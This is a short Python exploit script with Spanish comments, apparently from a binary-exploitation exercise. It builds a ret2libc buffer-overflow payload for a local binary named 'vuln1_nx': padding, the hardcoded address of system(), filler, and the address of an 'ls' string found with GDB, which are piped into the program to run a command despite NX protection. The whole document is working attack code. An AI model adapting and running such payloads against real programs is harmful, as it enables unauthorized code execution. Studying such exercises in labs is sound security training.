# !/usr/bin/env python3
import struct
import sys

offset = 94 # Ajustar segun lo hallado

# (gdb) p system
system_addr = 0xf7dba220 

# Opcion con GDB
# find 0xf7d7c000, 0xf7f9a000, "ls"
# ls_addr = 0xf7d7fd37
# jump = system_addr - 0xf7d7fd37
ls_jump = 0x3a4e9

payload = b"A" * offset
payload += struct.pack ( "<I" , system_addr )
payload += b"JUNK" # Relleno
payload += struct.pack ( "<I" , system_addr - ls_jump )

# (python3 ./exploit.py; cat) | ./vuln1_nx
sys.stdout.buffer.write (payload)
